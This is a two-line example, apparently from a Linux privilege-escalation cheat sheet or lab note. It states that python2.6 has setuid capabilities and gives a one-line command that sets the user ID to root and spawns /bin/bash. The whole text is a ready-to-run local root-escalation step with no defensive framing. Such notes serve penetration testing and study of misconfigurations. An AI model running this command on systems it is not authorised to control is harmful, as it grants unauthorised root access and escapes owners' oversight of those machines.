Example:
python2.6 has setuid capabilities. We can exploit it like this:
```bash
python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```